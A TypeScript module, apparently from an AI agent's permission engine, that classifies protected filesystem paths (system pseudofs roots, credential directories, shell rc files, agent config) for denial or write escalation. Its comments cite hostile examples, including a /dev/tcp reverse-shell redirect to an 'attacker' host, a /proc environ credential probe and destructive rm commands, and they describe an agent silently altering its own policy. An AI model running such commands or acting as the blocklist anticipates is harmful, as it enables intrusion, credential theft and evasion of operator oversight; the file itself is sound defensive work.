// Protected paths per PERMISSION_ENGINE.md §11. Hardcoded in code,
// NOT in policy file: policy can never relax these. Two tiers:
//
//   - 'deny'     — refuse outright in any op. Reads and writes alike.
//                  Applies to system pseudofs roots (/proc, /sys, /boot)
//                  whose contents are kernel-managed; an LLM-driven write
//                  there is always a bug or attack. Reads of these are
//                  also rejected: legitimate need is rare, and a
//                  "read /proc/<pid>/environ" probe is a known
//                  credential-exfil shape.
//
//   - 'escalate' — uncovered by writes/deletes. An `allow` rule that
//                  matches one of these paths is upgraded to `confirm`
//                  before returning to the caller. `deny` rules still
//                  win (operator who wants explicit deny on a parent
//                  layer keeps that authority). Reads are not affected
//                  — operators legitimately read /etc/hosts, .git/HEAD,
//                  ~/.bashrc.
//
// The `escalate` tier intentionally does NOT block writes outright.
// `.git/HEAD` rewrites happen via `git_*` tools that have their own
// confirm UX in policy; the operator can authorize `.git/` writes once
// per session via the modal. The `deny` tier IS outright because there
// is no analogous "git_* for /proc" — a write there is always wrong.
//
// Bash-side enforcement (a `bash` tool running `rm -rf /etc`) is NOT
// covered here: bash invocations consult `tools.bash`, not `tools.*_file`.
// Closing that gap requires the bash AST resolver (PERMISSION_ENGINE.md
// §5.2). Slice 147 (review fix): the bash resolver's `cmdRm` carries
// the hardcoded `RM_REFUSE_ROOTS` blocklist for `rm` arguments that
// resolve to `/`, `/etc`, `/usr`, `/home`, `~`, etc. — the literal
// blocklist this comment pre-slice CLAIMED existed but didn't. The
// score gate (capability_risk + workspace_escape + blocklist_command)
// still adds defense in depth for non-rm shapes (e.g. `find / -delete`).
// This module catches fs-tool-driven attempts (`write_file`, `edit_file`,
// `glob`, `grep`) that bypass the bash AST entirely.

import { resolve } from 'node:path';

export type ProtectedTier = 'deny' | 'escalate';

export type ProtectedOp = 'read' | 'write';

export interface ProtectedClassifyInput {
  absPath: string;
  op: ProtectedOp;
  home: string;
  cwd: string;
}

// Absolute prefixes that always deny. Each entry is a directory: a
// path classifies as `deny` when it equals one of these or descends
// from one (`startsWithSegment` semantics — `/proc` matches `/proc/`
// or `/proc/foo` but not `/procfoo`).
//
// `/dev` (slice 97, R2 finding #12): device nodes are kernel-managed
// like /proc and /sys. An LLM-driven write to `/dev/sda` would
// overwrite a raw disk; `cat /dev/tcp/attacker/80 > shell` is the
// canonical reverse-shell-via-redirect shape. Reads of `/dev/random`
// or `/dev/zero` are legitimate but rare; refusing them outright
// pushes operators to explicitly invoke a non-LLM tool, which is
// the safer default for kernel-managed pseudofs.
const SYSTEM_DENY_ROOTS: readonly string[] = ['/proc', '/sys', '/boot', '/dev'];

// Tilde-rooted files that escalate on write. Each entry is resolved
// against the operator's `$HOME` at classification time. We list the
// canonical shell rc files plus the agent's own config dirs so the
// model can't quietly amend the policy via `write_file`.
//
// `.netrc` / `.npmrc` (slice 97, R2 P1 finding): per-protocol
// credential files (`.netrc` for FTP/HTTP, `.npmrc` for the npm
// registry). Operator writes to these are legitimate during account
// setup but rare during agent work; escalating on write defends
// against silent credential injection by a hostile agent definition.
const TILDE_ESCALATE_FILES: readonly string[] = [
  '.bashrc',
  '.zshrc',
  '.profile',
  '.bash_profile',
  '.netrc',
  '.npmrc',
];

// `.ssh`, `.aws`, `.gnupg`, `.kube` (slice 97, R2 P1 finding):
// per-service credential trees. Writing any file under them admits
// silent key/credential injection (`.ssh/authorized_keys`,
// `.aws/credentials`, `.gnupg/private-keys-v1.d/`, `.kube/config`).
// Reads pass through — agents legitimately enumerate `.kube/config`
// to know which cluster they're targeting — but writes always
// escalate. Adding these to the dir list (vs the file list) means
// the classifier matches `.ssh/known_hosts` AND `.ssh/foo/bar`
// alike via `startsWithSegment`.
const TILDE_ESCALATE_DIRS: readonly string[] = [
  '.config/agent',
  '.config/claude',
  '.ssh',
  '.aws',
  '.gnupg',
  '.kube',
];

// Absolute roots that escalate on write regardless of cwd or home.
const ABSOLUTE_ESCALATE_ROOTS: readonly string[] = ['/etc'];

// Project-relative directories that escalate on write. Each entry is
// joined against the session's `cwd` at classification time. The
// engine's own state lives under `.agent/` (sessions, traces, policy
// archive); CI/operator state is under `.git/` and `.claude/`.
const CWD_ESCALATE_DIRS: readonly string[] = ['.git', '.agent', '.claude'];

// Posix-only. Path comparison uses textual prefix match after
// normalization; `startsWith(prefix + '/')` plus equality avoids
// false positives like `/procfoo` matching `/proc`.
const startsWithSegment = (path: string, prefix: string): boolean =>
  path === prefix || path.startsWith(`${prefix}/`);

// Resolve a tilde-or-relative entry to its absolute form. Used by both
// the classifier and the policy validator (policy load must reject
// patterns that would shadow these targets).
const resolveTildeFile = (home: string, file: string): string => resolve(home, file);
const resolveCwdDir = (cwd: string, dir: string): string => resolve(cwd, dir);

// Slice 161 (review — hot-path memoization). `classifyProtectedPath`
// runs in the per-tool-call hot path AND inside the bash bypass
// capability loop (per-cap). Pre-slice it called `resolve(home, file)`
// 6 times for `TILDE_ESCALATE_FILES`, `resolve(home, dir)` 2 times for
// `TILDE_ESCALATE_DIRS`, and `resolve(cwd, dir)` 3 times for
// `CWD_ESCALATE_DIRS` on every invocation. `home` is frozen at
// SessionStart per spec §4.3; `cwd` is also frozen. So the resolves
// are pure on the (home, cwd) tuple and can be memoized.
//
// Cache key = `home + '\0' + cwd` (NUL byte separator avoids
// collisions where one of the strings ends with the other). Cache
// entries are bounded by the union of distinct (home, cwd) tuples
// the process ever sees — for a typical agent session that's ONE
// entry; even for tests bootstrapping many engines it's tens.

interface ResolvedProtectedTargets {
  tildeEscalateFiles: readonly string[];
  tildeEscalateDirs: readonly string[];
  cwdEscalateDirs: readonly string[];
}

const targetCache = new Map<string, ResolvedProtectedTargets>();

const getResolvedTargets = (home: string, cwd: string): ResolvedProtectedTargets => {
  const key = `${home}\0${cwd}`;
  let entry = targetCache.get(key);
  if (entry === undefined) {
    entry = {
      tildeEscalateFiles: TILDE_ESCALATE_FILES.map((f) => resolveTildeFile(home, f)),
      tildeEscalateDirs: TILDE_ESCALATE_DIRS.map((d) => resolveTildeFile(home, d)),
      cwdEscalateDirs: CWD_ESCALATE_DIRS.map((d) => resolveCwdDir(cwd, d)),
    };
    targetCache.set(key, entry);
  }
  return entry;
};

export const classifyProtectedPath = (input: ProtectedClassifyInput): ProtectedTier | null => {
  const { absPath, op, home, cwd } = input;

  // Tier `deny` — applies to reads and writes alike. SYSTEM_DENY_ROOTS
  // is a constant (no per-call resolve needed).
  for (const root of SYSTEM_DENY_ROOTS) {
    if (startsWithSegment(absPath, root)) return 'deny';
  }

  // Tier `escalate` — only writes/deletes are upgraded. Reads pass
  // through; the engine's regular allow/confirm/deny chain still runs.
  if (op === 'read') return null;

  // ABSOLUTE_ESCALATE_ROOTS is constant too.
  for (const root of ABSOLUTE_ESCALATE_ROOTS) {
    if (startsWithSegment(absPath, root)) return 'escalate';
  }
  // Tilde + cwd resolves come from the (home, cwd) cache — slice 161.
  const targets = getResolvedTargets(home, cwd);
  for (const file of targets.tildeEscalateFiles) {
    if (absPath === file) return 'escalate';
  }
  for (const dir of targets.tildeEscalateDirs) {
    if (startsWithSegment(absPath, dir)) return 'escalate';
  }
  for (const dir of targets.cwdEscalateDirs) {
    if (startsWithSegment(absPath, dir)) return 'escalate';
  }

  return null;
};

// Render the same set of absolute targets the classifier checks
// against. Used by `parsePolicy` to reject allow/confirm patterns
// that would shadow these locations. Returned as absolute strings —
// the policy validator compares pattern → resolvable absolute and
// verifies it doesn't EQUAL one of these (literal redefinition).
// Glob shapes (`/etc/**`) are intentionally allowed as `deny_paths`
// entries; the validator only rejects allow/confirm.
export interface ProtectedTargets {
  systemDeny: readonly string[];
  absoluteEscalate: readonly string[];
  tildeEscalateFiles: readonly string[];
  tildeEscalateDirs: readonly string[];
  cwdEscalateDirs: readonly string[];
}

export const protectedTargets = (home: string, cwd: string): ProtectedTargets => ({
  systemDeny: SYSTEM_DENY_ROOTS,
  absoluteEscalate: ABSOLUTE_ESCALATE_ROOTS,
  tildeEscalateFiles: TILDE_ESCALATE_FILES.map((f) => resolveTildeFile(home, f)),
  tildeEscalateDirs: TILDE_ESCALATE_DIRS.map((d) => resolveTildeFile(home, d)),
  cwdEscalateDirs: CWD_ESCALATE_DIRS.map((d) => resolveCwdDir(cwd, d)),
});

// Stable list of all protected absolute prefixes (deny + escalate
// combined) for use by policy validators that don't care about tier
// — they just need to reject allow patterns whose literal form would
// shadow ANY protected target.
export const allProtectedRoots = (home: string, cwd: string): readonly string[] => {
  const t = protectedTargets(home, cwd);
  return [
    ...t.systemDeny,
    ...t.absoluteEscalate,
    ...t.tildeEscalateFiles,
    ...t.tildeEscalateDirs,
    ...t.cwdEscalateDirs,
  ];
};
